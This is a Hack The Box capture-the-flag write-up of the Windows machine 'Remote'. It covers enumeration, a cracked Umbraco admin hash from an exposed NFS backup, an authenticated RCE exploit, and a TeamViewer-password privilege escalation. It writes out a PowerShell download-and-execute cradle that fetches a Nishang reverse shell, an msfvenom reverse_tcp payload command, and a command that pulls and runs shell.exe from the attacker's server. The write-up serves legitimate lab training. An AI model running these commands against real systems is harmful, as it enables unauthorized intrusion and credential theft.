---
title: HTB | Remote
image: /images/rm-title.webp
date: 2020-09-05 17:00:00 -4:00
categories: [CTF, HTB]
tags: [nfs, 'network file system', umbraco, nishang, powershell, msfvenom, winpeas, teamviewer, evil-winrm, windows] 

---

# Description
>This is a write-up for the machine `Remote` from `Hack The Box`. [Hack The Box](https://www.hackthebox.eu/) is an online platform to train your ethical hacking skills and penetration testing skills.
>
>Remote is an ‘easy’ rated box. Grabbing and submitting the user.txt flag, your points will be raised by 10 and submitting the root flag you points will be raised by 20.

![](/images/rm-stats.png)

# Information Gathering
There's a lot of enumeration to be done on this box. Like always, start with Nmap.

## Nmap
`nmap -sC -sV 10.10.10.180`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 15:57 CEST                                                           
Nmap scan report for 10.10.10.180
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
```
A lot of ports are open. First thing I noticed was ftp with anonymous login. You can try it out, but there's nothing here.

![](/images/rm-ftp.png)

It's a good idea to get other automated scanners started before you go poking around manually. So I ran a nikto scan next.

## nikto
`nikto -h 10.10.10.180`

This didn't return back anything useful.

![](/images/rm-nikto.png)

While the nikto scan was running I also started a gobuster scan to enumerate directories.

## gobuster
`gobuster dir -u http://10.10.10.180 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -o dir.out`

gobuster returns a lot of directories for us. The `/install` directory is the one we care about.

![](/images/rm-gobuster.png)

gobuster shows a 302 redirect code. If you go to the directory it redirects you to `/umbraco`

![](/images/rm-umbraco.png)

It's a login portal and the username field tells us we will need an email format. Keep this in mind once we get some creds. 

Umbraco is a content management system with some known exploits. Use searchsploit or google and research further.

![](/images/rm-umbraco-searchsploit.png)

In order to progress with the box, the next service to look into is NFS on port `2049`

## NFS (Network File System)
Let's check out what is going on with this NFS share.

`showmount -e 10.10.10.180`

![](/images/rm-showmount.png)

Interesting, there is a mount available to everyone that seems to be a backup of the site. So pull it down and hunt for some sensitive information.

Make a directory to put the `/site_backups` in. Mine is at `/mnt/site_backups` on my local machine.

`sudo mount -t nfs 10.10.10.180:/site_backups /mnt/site_backups`

>If you have issues with this command, use `-o nolock` at the end.

Navigate to the new mounted directory.

![](/images/rm-mount.png)

After a lot of searching around, I eventually found `/App_Data/Umbraco.sdf`. This is a SQL compact database file, so you should be thinking about potential creds here.

## Unbraco.sdf
This is a binary file, so viewing it can be annoying from the console. I used `strings` and piped it to `less`. The first few lines gives us everything we need.

```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```

So we have a username of `admin@htb.local` and a SHA-1 hashed password. You can crack this on your local machine with john or hashcat, but I always try a browser option first for CTFs. I like using [md5hashing.net](https://md5hashing.net/) and it works perfect here. 

![](/images/rm-hash.png)

Looks like we have some potential creds for the umbraco login portal from earlier. 

`admin@htb.local:baconandcheese`

# Initial Foothold
Logging into the Umbraco portal with the admin credentials works!

![](/images/rm-login.png)

If you remember from the searchsploit output from earlier, there are three known exploits. The one we are interested in is the authenticated RCE since we have valid creds. 

The exploit you will come across from [exploit-db](https://www.exploit-db.com/exploits/46153) has some issues with it, so it's back to the old google. 

![](/images/rm-exploidb.png)

## Umbraco-RCE
Searching for `Umbraco exploit` in google should bring you to [noraj's Umbraco RCE](https://github.com/noraj/Umbraco-RCE) on his github. This is what I used to get onto the box.

Git clone the repo on to your local machine.

![](/images/rm-gclone.png)

`usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]`

To test it is working as intended, run a `whoami` as the command.

![](/images/rm-extest.png)

Okay, so we have confirmed remote code execution working. Now we should be thinking about getting a shell on the box.

## Nishang
>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

Since we are attacking a windows machine, we're going to use Nishang's reverse tcp powershell script. [Clone the repo](https://github.com/samratashok/nishang) to your machine or just simply use the script found at `nishang/Shells/Invoke-PowerShellTcp.ps1`

## Invoke-PowerShellTcp.ps1
Copy the `Invoke-PowerShellTcp.ps1` script to a directory that will be served as a web server in just a bit. Open the script in an editor and notice there are example templates for different types of shells. Copy the reverse example and paste it to the bottom of the file.

![](/images/rm-shelltemp.png)

Replace the IP address with your IP and a port number to listen on.

![](/images/rm-shelltemp2.png)

Now we need to make this file available for download, so we can download it from the target machine using our code execution abilities.
```
┌──(adam㉿Harambe)-[~/htb/remote/www]
└─$ sudo python3 -m http.server 80
``` 
>Remember you have to do this in the directory your powershell script is in.

Setup a listener on your machine on the port you used from the command. 
```
┌──(adam㉿Harambe)-[~/htb/remote]
└─$ nc -lvnp 9001         
Listening on 0.0.0.0 9001
```

### Powershell-Fu

Now for the tough part, we need to craft a command using powershell's syntax and fit it into the RCE exploit's command syntax.

With some googling, I found `"IEX (New-Object Net.WebClient).DownloadString('https://location/to/file')` as the powershell command to download a file. So for the exploit's syntax, `-c` will be `powershell.exe` and the argument will be `"IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')"`

![](/images/rm-dl.png)

If everything was set up correctly, you should have a session going on your nc listener and are now on the box.

![](/images/rm-revshell.png)

# User Flag
From here we have access to the user flag and you can find it in the `C:\users\Public` directory.

![](/images/rm-user.png)

# Priv Esc
The first thing I'm going do is upgrade our shell to a [meterpreter shell](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) which will make things easier for us here in a bit.

## msfvenom
Use msfvenom to create the shell code binary we will need to execute on the victim machine. 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
Put this in the web server directory you have from earlier. 

![](/images/rm-msfven.png)

Now set up a listener using the metasploit module `/exploit/multi/handler`

set the `LHOST` `LPORT` and `payload` to match our msfvenom shell.

![](/images/rm-multihan.png)

Now back on the victim machine, move into the `C:\Windows\Temp` directory and use the `Invoke-WebRequest "http://<IP>/shell.exe" -Outfile shell.exe` command to download the meterpreter binary and execute it.

![](/images/rm-shell-dl.png)

Go back to your listener and you should have a meterpreter shell running.

![](/images/rm-met.png)

## winPEAS
To enumerate information in order to escalate privileges I like to use [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). 

With meterpreter, it's really easy to upload and download files back and forth. So use the upload command from your meterpreter shell and point to the location of the winPEAS.exe. Default location from the repo: `privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe`

![](/images/rm-winpeas.png)

Just execute the binary with the command `execute -f winPEAS.exe -i -H` and see what we got. There's a lot of output here, so focus on the section `(Services Information) | Interesting Services -non Microsoft-` and notice that TeamViewer is running.

![](/images/rm-teamview.png)

If you google `TeamViewer exploit`, you will find a metaploit module that finds and decrypts stored TeamViewer passwords.

![](/images/rm-rapid7.png)

## TeamViewer Password
Let's use this module, so background our meterpreter session and run a search for `teamviewer`. All we need to do is set the session number. It should be 1, but just double check the output from the `background` command.

![](/images/rm-session.png)

Just run the module and you will get a password.

![](/images/rm-pass.png)

## Evil-WinRM
I spent a lot of time trying to figure out how to use this password and was trying to leverage TeamViewer in the process. However, this is a *password* and maybe another user uses this as their login. And from out Nmap scan we know that Remote Management is running, so why not try to login as the Administrator using this password? For this, I'm going to use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).
>You may have some issues putting in the password in the command line since it has *!*'s. Just use quotes and escape slashes.

Success! We have admin on the box.

![](/images/rm-admin.png)

# Root Flag
From here we just need to go to the Administrator's Desktop to get the root flag.

![](/images/rm-rootflag.png)